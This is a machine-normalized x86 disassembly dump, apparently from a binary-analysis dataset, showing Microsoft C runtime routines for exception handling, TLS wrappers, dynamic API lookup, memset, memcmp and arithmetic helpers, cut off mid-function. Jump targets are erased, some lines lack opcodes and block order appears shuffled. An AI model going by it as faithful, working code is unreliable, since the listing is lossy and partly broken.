mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_426240
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_41c5bd
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_4246d6
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
xor esi esi
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_41bd12
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_41c4e4
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41c69c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_41cb70
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_41c755
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ TlsSetValue@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_41c777
push ebp
mov ebp esp
sub esp 0x44
lea eax [ ebp - 0x44 ]
push eax
call [ GetStartupInfoW@IAT ]
test [ ebp - 0x18 ] 0x1
je r-xdata
push 0xa
pop eax
leave
retn
movzx eax [ ebp - 0x14 ]
leave
retn
sub_41c798
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
xor eax eax
inc eax
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_41c7c6
push ebp
mov ebp esp
push ecx
push esi
mov esi [ rw-data ]
test esi esi
jns r-xdata
xor eax eax
test esi esi
setg al
pop esi
leave
retn
mov eax [ rw-data ]
xor esi esi
xor eax [ rw-data ]
mov [ ebp - 0x4 ] esi
je r-xdata
mov [ rw-data ] esi
push esi
lea ecx [ ebp - 0x4 ]
push ecx
call eax
cmp eax 0x7a
jne r-xdata
inc esi
sub_41c804
push esi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov esi [ GetProcAddress@IAT ]
mov edi eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
mov [ rw-data ] eax
push r--data
push edi
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
push r--data
push edi
mov [ rw-data ] eax
call esi
xor eax [ rw-data ]
pop edi
mov [ rw-data ] eax
pop esi
retn
sub_41ca9b
call sub_4233cd
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_4233f6
pop ecx
push 0x3
call sub_4187b5
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_41f2b6
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_41cae0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
movzx eax [ esp + 0x8 ]
bt [ rw-data ] 0x1
jae r-xdata
mov edx [ esp + 0xc ]
cmp edx 0x80
jl r-xdata
mov ecx [ esp + 0xc ]
push edi
mov edi [ esp + 0x8 ]
[ edi ]
jmp r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
bt [ rw-data ] 0x1
jb r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
test eax eax
jne r-xdata
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
movd xmm0 eax
punpcklbw xmm0 xmm0
punpcklwd xmm0 xmm0
pshufd xmm0 xmm0 0x0
pxor xmm0 xmm0
jmp r-xdata
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
neg ebx
add ebx 0x10
sub edx ebx
push edx
mov edx ebx
and edx 0x3
je r-xdata
mov ebx edx
and edx 0x7f
shr ebx 0x7
je r-xdata
push ebx
push ecx
mov ebx ecx
and ebx 0xf
test ebx ebx
jne r-xdata
shr ebx 0x2
je r-xdata
mov [ ecx ] al
inc ecx
dec edx
jne r-xdata
test edx edx
je r-xdata
movdqa [ ecx ] xmm0
movdqa [ ecx + 0x10 ] xmm0
movdqa [ ecx + 0x20 ] xmm0
movdqa [ ecx + 0x30 ] xmm0
movdqa [ ecx + 0x40 ] xmm0
movdqa [ ecx + 0x50 ] xmm0
movdqa [ ecx + 0x60 ] xmm0
movdqa [ ecx + 0x70 ] xmm0
lea ecx [ ecx + 0x80 ]
dec ebx
jne r-xdata
pop edx
jmp r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec ebx
jne r-xdata
pop eax
pop ebx
retn
mov ebx edx
shr ebx 0x4
je r-xdata
and edx 0xf
je r-xdata
jmp r-xdata
mov ebx edx
shr edx 0x2
je r-xdata
movdqa [ ecx ] xmm0
lea ecx [ ecx + 0x10 ]
dec ebx
jne r-xdata
and ebx 0x3
je r-xdata
movd [ ecx ] xmm0
lea ecx [ ecx + 0x4 ]
dec edx
jne r-xdata
mov [ ecx ] al
inc ecx
dec ebx
jne r-xdata
sub_41cb70
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
or eax 0x1
retn
test al al
je r-xdata
test al al
je r-xdata
add ecx 0x1
test al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
test ah ah
je r-xdata
test ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
test al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
test ah ah
jne r-xdata
mov edi edi
sub_41cc00
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_41ccd0
push ebp
mov ebp esp
push esi
call sub_41ccbd
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_41cd04
pop ecx
mov esi eax
call sub_41ccf1
mov [ eax ] esi
pop esi
pop ebp
retn
sub_41cd04
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
xor eax eax
mov eax [ eax * 8 + rw-data ]
pop ebp
retn
inc eax
cmp eax 0x2d
jb r-xdata
cmp ecx [ eax * 8 + rw-data ]
je r-xdata
lea eax [ ecx - 0x13 ]
cmp eax 0x11
ja r-xdata
lea eax [ ecx - 0xbc ]
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_41cd5e
push ebp
mov ebp esp
sub esp 0x18
lea ecx [ ebp - 0x18 ]
push ebx
push edi
push [ ebp + 0xc ]
call sub_4199d2
mov ebx [ ebp + 0x8 ]
mov edi 0x100
cmp ebx edi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x74 ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0x74 ] 0x1
jle r-xdata
call sub_41ccf1
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov eax ebx
sar eax 0x8
mov [ ebp + 0x8 ] eax
lea ecx [ ebp - 0x18 ]
movzx eax al
push ecx
push eax
call sub_427df7
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0x90 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_426813
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
mov eax [ ecx + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
test eax eax
je r-xdata
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41b843
add esp 0x24
test eax eax
jne r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax edx
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_41ce9f
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41cd5e
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_41ced0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_41cf10
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_41cf78
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
mov eax ebx
push esi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
mov eax [ ebp + 0xc ]
movzx eax [ eax ]
jmp r-xdata
dec eax
je r-xdata
sub ecx eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
dec eax
je r-xdata
mov eax ecx
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx ecx [ edx ]
movzx eax [ esi ]
sub ecx eax
je r-xdata
mov edx [ ebp + 0xc ]
dec eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
movzx ecx [ edx + 0x1 ]
movzx eax [ esi + 0x1 ]
sub ecx eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx eax [ edx ]
movzx esi [ ecx ]
sub esi eax
je r-xdata
mov esi [ ebp + 0x8 ]
push edi
cmp ebx 0x20
jb r-xdata
movzx ecx [ edx + 0x2 ]
movzx eax [ esi + 0x2 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
movzx esi [ ecx + 0x1 ]
movzx eax [ edx + 0x1 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
add esi ebx
add edx ebx
cmp ebx 0x1f
ja r-xdata
mov eax [ esi ]
cmp eax [ edx ]
je r-xdata
movzx esi [ ecx + 0x2 ]
movzx eax [ edx + 0x2 ]
sub esi eax
je r-xdata
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
xor ecx ecx
jmp [ ebx * 4 + jump_table_41e670 ]
xor ecx ecx
movzx edi al
movzx eax [ edx ]
sub edi eax
je r-xdata
movzx ecx [ ecx + 0x3 ]
movzx eax [ edx + 0x3 ]
xor eax eax
test esi esi
setg al
lea eax [ eax * 2 - 0x1 ]
test eax eax
jne r-xdata
mov eax [ esi - 0x1c ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ esi - 0x18 ]
cmp eax [ edx - 0x18 ]
je r-xdata
mov eax [ esi - 0x14 ]
cmp eax [ edx - 0x14 ]
je r-xdata
mov eax [ esi - 0x10 ]
cmp eax [ edx - 0x10 ]
je r-xdata
mov eax [ esi - 0xc ]
cmp eax [ edx - 0xc ]
je r-xdata
mov eax [ esi - 0x8 ]
cmp eax [ edx - 0x8 ]
je r-xdata
mov eax [ esi - 0x4 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ esi - 0x1d ]
cmp eax [ edx - 0x1d ]
je r-xdata
mov eax [ esi - 0x19 ]
cmp eax [ edx - 0x19 ]
je r-xdata
mov eax [ esi - 0x15 ]
cmp eax [ edx - 0x15 ]
je r-xdata
mov eax [ esi - 0x11 ]
cmp eax [ edx - 0x11 ]
je r-xdata
mov eax [ esi - 0xd ]
cmp eax [ edx - 0xd ]
je r-xdata
mov eax [ esi - 0x9 ]
cmp eax [ edx - 0x9 ]
je r-xdata
mov eax [ esi - 0x5 ]
cmp eax [ edx - 0x5 ]
je r-xdata
movzx eax [ edx - 0x1 ]
movzx ecx [ esi - 0x1 ]
sub ecx eax
je r-xdata
mov eax [ esi - 0x1e ]
cmp eax [ edx - 0x1e ]
je r-xdata
mov eax [ esi - 0x1a ]
cmp eax [ edx - 0x1a ]
je r-xdata
mov eax [ esi - 0x16 ]
cmp eax [ edx - 0x16 ]
je r-xdata
mov eax [ esi - 0x12 ]
cmp eax [ edx - 0x12 ]
je r-xdata
mov eax [ esi - 0xe ]
cmp eax [ edx - 0xe ]
je r-xdata
mov eax [ esi - 0xa ]
cmp eax [ edx - 0xa ]
je r-xdata
mov eax [ esi - 0x6 ]
cmp eax [ edx - 0x6 ]
je r-xdata
mov ax [ esi - 0x2 ]
cmp ax [ edx - 0x2 ]
je r-xdata
mov eax [ esi - 0x1f ]
cmp eax [ edx - 0x1f ]
je r-xdata
mov eax [ esi - 0x1b ]
cmp eax [ edx - 0x1b ]
je r-xdata
mov eax [ esi - 0x17 ]
cmp eax [ edx - 0x17 ]
je r-xdata
mov eax [ esi - 0x13 ]
cmp eax [ edx - 0x13 ]
je r-xdata
mov eax [ esi - 0xf ]
cmp eax [ edx - 0xf ]
je r-xdata
mov eax [ esi - 0xb ]
cmp eax [ edx - 0xb ]
je r-xdata
mov eax [ esi - 0x7 ]
cmp eax [ edx - 0x7 ]
je r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
mov eax ecx
pop edi
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ edx + 0x4 ]
je r-xdata
movzx edi [ esi + 0x1 ]
movzx eax [ edx + 0x1 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xc ]
movzx edi [ esi - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0x9 ]
movzx edi [ esi - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xa ]
movzx edi [ esi - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1f ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
movzx eax [ edx - 0xf ]
movzx edi [ esi - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
movzx eax [ edx - 0x2 ]
movzx edi [ esi - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x4 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x2 ]
movzx eax [ edx + 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1e ]
movzx eax [ edx - 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
